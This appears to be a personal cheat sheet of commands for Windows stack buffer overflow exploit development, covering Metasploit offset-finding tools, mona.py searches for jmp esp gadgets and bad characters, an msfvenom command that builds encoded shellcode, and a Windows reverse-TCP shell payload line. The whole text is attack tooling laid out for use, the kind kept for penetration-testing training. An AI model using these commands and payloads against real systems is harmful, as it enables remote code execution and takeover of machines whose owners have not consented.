##### msf-pattern_create -l 5000
##### msf-pattern_offset -q 0x000000
##### litend 000000 x

#### mona (jmp esp)
`!mona find -s "\xff\xe4" -m sample.dll`<br>
`!mona jmp -r esp`<br> 

#### mona (bad char)
`!mona config -set workingfolder c:\logs\%p` <br>
`!mona bytearray`<br>
`!mona compare -f C:\logs\sample\bytearray.bin -a eip`<br>
`!mona bytearray -cpb "\x00"`

#### msfvenom 
`msfvenom -p windows/exec -b '\x00\x0a' -e x86/shikata_ga_nai -n 16 -f python --var-name calc CMD=calc.exe EXITFUNC=thread` <br>
#### shellcode
`windows/shell_reverse_tcp LHOST=0.0.0.0 LPORT=4444`



